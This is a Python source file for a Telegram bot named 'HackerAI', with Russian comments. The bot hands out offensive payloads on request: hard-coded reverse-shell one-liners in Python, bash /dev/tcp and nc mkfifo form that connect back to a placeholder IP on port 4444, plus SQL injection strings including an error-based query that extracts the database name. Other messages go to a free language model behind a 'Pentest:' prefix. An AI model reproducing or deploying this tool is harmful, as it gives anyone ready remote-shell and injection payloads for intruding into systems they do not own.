import telebot
import os
from flask import Flask
import requests
import json

TOKEN = os.getenv("BOT_TOKEN")  # Добавишь потом
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# БЕСПЛАТНЫЙ OpenRouter (регистрация 2 мин)
OPENROUTER_KEY = os.getenv("OPENROUTER_KEY")
OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"

# Готовые шаблоны (работают без API)
SHELLS = {
    "python": "python3 -c 'import socket,subprocess,os; s=socket.socket();s.connect((\"IP\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "bash": "bash -i >& /dev/tcp/IP/4444 0>&1",
    "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f"
}

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🔥 HackerAI iPhone Bot!\nshells, exploits, sql, xss")

@bot.message_handler(func=lambda m: any(kw in m.text.lower() for kw in ["shell", "reverse"]))
def shells(message):
    lines = ["```bash", SHELLS["python"], SHELLS["bash"], "```"]
    bot.reply_to(message, "\n".join(lines), parse_mode='Markdown')

@bot.message_handler(func=lambda m: "sql" in m.text.lower())
def sql(message):
    payload = "' OR 1=1 --"
    bot.reply_to(message, f"```sql\n{payload}\n```Blind: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)\n```", parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle(message):
    if not OPENROUTER_KEY:
        bot.reply_to(message, "Получи ключ: openrouter.ai → Free tier")
        return
        
    try:
        resp = requests.post(OPENROUTER_URL, headers={
            "Authorization": f"Bearer {OPENROUTER_KEY}",
            "Content-Type": "application/json"
        }, json={
            "model": "meta-llama/llama-3.2-1b-instruct:free",
            "messages": [{"role": "user", "content": f"Pentest: {message.text}"}]
        })
        bot.reply_to(message, resp.json()['choices'][0]['message']['content'])
    except:
        bot.reply_to(message, "API недоступен. Пиши: shells/sql/xss")

app.route('/')(lambda: {"status": "iPhone HackerAI OK!"})

# Replit запуск
from threading import Thread
Thread(target=bot.polling, daemon=True).start()
app.run(host='0.0.0.0', port=8080)
